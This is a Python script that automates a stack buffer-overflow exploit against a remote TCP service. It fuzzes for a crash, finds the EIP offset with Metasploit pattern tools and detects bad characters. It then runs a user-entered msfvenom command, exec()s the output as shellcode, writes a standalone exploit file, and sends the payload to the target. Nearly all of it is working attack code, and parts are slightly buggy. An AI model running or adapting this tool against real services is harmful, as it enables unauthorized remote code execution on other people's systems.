#!/usr/bin/python
import socket
import sys
import os
import re
import struct
from argparse import ArgumentParser

# If your remote server may take more than seven seconds to respond, increase this value.
TIMEOUT = 7.0
INCREMENT = 200  # This is how many bytes the fuzzer steps each iteration
ITERATIONS = 30  # This is how many iterations we perform total. Adjust these two variables to alter the precision/scale

host = None
port = None
debug = False
outputFile = None
help = False
prefix = ""
suffix = ""

parser = ArgumentParser()
parser.add_argument("-o", "--output", default=False,
                    help="Write payload script to FILE", metavar="FILE")
parser.add_argument("-b", "--badchars", action="store_true", default=False,
                    help="Attempt to detect bad characters with your debugger of choice")
parser.add_argument("-p", "--prefix", default="",
                    help="Append a prefix to the beginning of your overflow string")
parser.add_argument("-s", "--suffix", default="",
                    help="Append a suffix to the end of your overflow string")
parser.add_argument(
    "host", help="The host executing the vulnerable application (usually your debugger)")
parser.add_argument(
    "port", type=int, help="The port the application is running on")

arguments = vars(parser.parse_args())
outputFile = arguments["output"]
debug = arguments["badchars"]
host = arguments["host"]
port = arguments["port"]
prefix = arguments["prefix"]
suffix = arguments["suffix"]

# The following allows the user to prefix and suffix the data with special characters
prefix = prefix.replace("\\n", "\n").replace('\\t', '\t').replace('\\r', '\r').replace(
    '\\v', '\v').replace('\\b', '\b').replace('\\a', '\a').replace('\\f', '\f').replace('\\\\', '\\')
suffix = suffix.replace('\\n', '\n').replace('\\t', '\t').replace('\\r', '\r').replace(
    '\\v', '\v').replace('\\b', '\b').replace('\\a', '\a').replace('\\f', '\f').replace('\\\\', '\\')

bytesToOverflow = 0  # Saves how many bytes crashed the service

# Create an array of buffers, from 1 to 5900, with increments of 200
buffer = ["A"]
counter = 100
while len(buffer) <= ITERATIONS:
    buffer.append("A"*counter)
    counter = counter+INCREMENT
for string in buffer:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)
    try:  # See if the server has crashed yet
        connect = s.connect((host, port))
        s.recv(1024)
    except:  # If it has crashed, we found our buffer length
        if bytesToOverflow == 0:
            print("\n(!) Could not connect to service. Please check the host and port, and ensure the application is running\n")
            exit()
        print("(*) Service crashed at " + str(bytesToOverflow) + " bytes")
        break
    print("(-) Fuzzing parameter with %s bytes" % len(string))
    s.send(str(prefix) + string + str(suffix))
    s.close()
    bytesToOverflow = len(string)

print("\nPlease restart the vulnerable application and your debugger. Press enter to continue")
raw_input()
print("(-) Generating unique pattern to obtain exact offset")
# Use this and pattern_offset to get exact offset
uniqueString = os.popen("msf-pattern_create -l " + str(bytesToOverflow)).read()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(TIMEOUT)
while True:  # We'll try again if we can't connect
    try:
        connect = s.connect((host, port))
        s.recv(1024)
    except:  # This means we couldn't connect
        print("(!) Could not connect to " + str(host))
        print("\nPress enter to try again")
        continue
    s.send(str(prefix) + uniqueString + str(suffix))
    s.close()
    break

print("Service crashed. Please enter the value shown in the EIP exactly as it appears (Big Endian)")
eip = raw_input("EIP: ")
eip = eip.replace("\\x", "")
eip = eip.replace("0x", "")
print("(-) Locating offset of EIP on the stack")
offsetString = os.popen("msf-pattern_offset -q " +
                        eip).read().split()  # Grab each word of output
offset = int(offsetString[-1])  # Last word of this command is the offset

if prefix:
    print("(*) Exact match at offset " + str(offset) +
          " (does not include the prefix)")
else:
    print("(*) Exact match at offset " + str(offset))

if debug:
    badCharList = []
    print("(-) Beginning bad character detection.")
    print("\nPlease restart the vulnerable service and your debugger. Press enter to continue")
    for i in range(256):
        # Add every character to our list to test
        badCharList.append(bytes(chr(i)))
    raw_input()
    if debug:  # TO DO: Remove this line and fix indentation
        foundChars = []  # List of characters that are bad
        print("(-) Assuming \\x00, \\x0a, and \\x0d are bad characters")
        badCharList.remove("\x00")
        badCharList.remove("\x0a")
        badCharList.remove("\x0d")
        foundChars.append("\x00")
        foundChars.append("\x0a")
        foundChars.append("\x0d")
        while True:  # Loop until we find all bad chars
            print("(-) Sending character list")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(TIMEOUT)
            while True:  # Loop if we can't connect
                try:
                    connect = s.connect((host, port))
                    s.recv(1024)
                except:  # This means we couldn't connect
                    print("(!) Could not connect to " + str(host))
                    print("\nPress enter to try again")
                    continue
                if int(offset) > len(badCharList):
                    s.send(str(prefix) + "".join(badCharList) + "A" *
                           (offset - len(badCharList)) + "BBBB" + str(suffix))
                else:
                    print(
                        "Could not find enough space before overflow. Attempting to insert character list after offset (may fail)")
                    s.send(str(prefix) + str("A"*offset + "BBBB") +
                           "".join(badCharList) + str(suffix))
                s.close()
                break
            print("\nPlease open your debugger and copy/paste the dump output from the beginning of the stack to least 256 bytes. Enter 2 newlines to stop or 'q' to terminate bad character detection.")
            debugOutput = ""
            while True:
                response = raw_input()
                if response == "" or response == "q":
                    break
                debugOutput += response + "\n"
            if debugOutput == "":  # If they quit
                break
            print("(-) Detecting bad characters")
            outputList = debugOutput.split("\n")  # Break up output into lines
            charList = []
            for line in outputList:
                if len(line.split(" ")) < 2:  # If we have a malformed line
                    continue
                # Break up line into three sections and grab bytes
                byteString = re.split(r'\s\s+', line)[1]
                charList.extend(byteString.split())
            if len(charList) < len(badCharList):
                print(
                    "\n(!) Dump not large enough! Please restart the application and try again! Press enter to continue\n\n")
                raw_input()
                continue
            foundCharsIteration = []
            # If one character corrupts all further characters, we can only assume the first is bad
            finalFoundChar = None
            finalCharBuffer = None
            # If the characters don't match, it's bad.
            for i in range(len(badCharList)):
                if badCharList[i] != bytes(chr(int(charList[i], 16))):
                    foundCharsIteration.append(badCharList[i])
                    finalCharBuffer = badCharList[i]
                else:
                    finalFoundChar = finalCharBuffer
            for character in foundCharsIteration:  # Add every character we know is bad to the list of bad characters
                foundChars.append(character)
                print("(*) Found bad character: " + bytes(character))
                # Don't use it when we run the test again
                badCharList.remove(character)
                if character == finalFoundChar or (not finalFoundChar and finalFoundChar != ""):
                    break  # If we never found a single match, our first character is bad

            if badCharList[len(badCharList) - 2] == bytes(chr(int(charList[len(badCharList) - 2], 16))) and badCharList[len(badCharList) - 1] != bytes(chr(int(charList[len(badCharList) - 1], 16))):
                foundChars.append(badCharList[len(badCharList) - 1])
                foundChars.append(badCharList[len(badCharList) - 1])
                # This is an edge case. If the final character is wrong but the one before it was correct, it's probably bad

            if len(foundCharsIteration) == 0:  # If all characters are good
                output = ""
                for character in foundChars:
                    output += hex(struct.unpack(">I",
                                  "\x00\x00\x00" + character)[0])
                print("(*) All bad characters found: " +
                      output.replace("0x", "\\x"))
                break

            print(
                "\nPlease restart the vulnerable service and your debugger. Press enter to continue")
            raw_input()

print("Please enter the full command of the msf payload you would like to generate")
payload = raw_input("Command: ")
print("(-) Generating payload")
payload = os.popen(payload).read()

buf = ""  # This is filled with our MSF payload
# Yes, I understand that exec is bad. No, it doesn't bother me. If you feed your own box pythonic malware while inside of a script, that's on you.
exec(payload)
buf = "\x90"*16 + buf  # Add NOP slide, wheeee!

# TO DO: Allow user to add additional instructions (such as adding 12 to EAX)
exploit = ""

insertBefore = False
if len(buf) > offset:
    print("(*) Payload longer than buffer. Attempting to add payload after offset")
else:
    print("Insert payload before or after overflow? (b/a)")
    while True:
        answer = raw_input(">> ").lower()
        if answer == "b":
            insertBefore = True
            break
        elif answer == "a":
            break

print("Please specify an address to jump to (Big Endian)")

evil = ""
while True:
    jump = raw_input("JMP: ")
    jump.replace("0x", "")
    jump.replace("\\x", "")
    evil = jump

    if len(jump) == 8:
        address = ""
        for i in range(4):  # Convert to usable bytes
            address += chr(int(jump[i*2:(i+1)*2], 16))
        jump = address
        break
    print("Not correct length for a 32-bit address. Try again")

# Here we change it to Little Endian for you. That's always a pain to do manually.
if not insertBefore:
    exploit = prefix + "A"*offset + jump[::-1] + buf + suffix
else:
    exploit = prefix + buf + "A"*(offset - len(buf)) + jump[::-1] + suffix

evil.replace("0x", "\\x")
if len(evil) == 8:  # If we need to insert backslashes for our output
    evil = "\\x" + '\\x'.join(evil[i:i+2] for i in range(0, len(evil), 2))

evil = "".join(reversed([evil[i:i+4]
               for i in range(0, len(evil), 4)]))  # Little Endian

if outputFile:
    print("(-) Generating output file (modify and run exploit from that file to debug)")
    malware = "#!/usr/bin/python\nimport socket\n" + payload
    malware += "buf = \"\\x90\"*16 + buf"  # NOP Sled
    if insertBefore:
        malware += "\nexploit = \"" + \
            str(prefix) + "\" + buf + \"A\"*(" + str(offset) + \
            "-len(buf)) + \"" + evil + suffix + "\""
    else:
        malware += "\nexploit = \"" + str(prefix) + "\" + \"A\"*" + str(
            offset) + " + \"" + evil + "\" + buf + \"" + str(suffix) + "\""
    malware += "\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nprint(\"(-)Sending exploit...\")"
    malware += "\ns.connect((\"" + host + "\"," + str(port) + "))\n"
    malware += "data=s.recv(1024)\nprint(data\ns.send(exploit)\ns.close())"
    file = open(outputFile, "w")
    file.write(malware)
    file.close()

print("Exploit ready. Launch? (y/n)")
while True:
    answer = raw_input(">> ").lower()
    if answer == "y" or answer == "n":
        break

if answer == "n":
    pass
else:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("(-) Sending exploit")
    s.connect((host, port))
    data = s.recv(1024)
    s.send(exploit)
    s.close()
    print("(*) Exploit Sent!")

print("(*) Script Complete.")
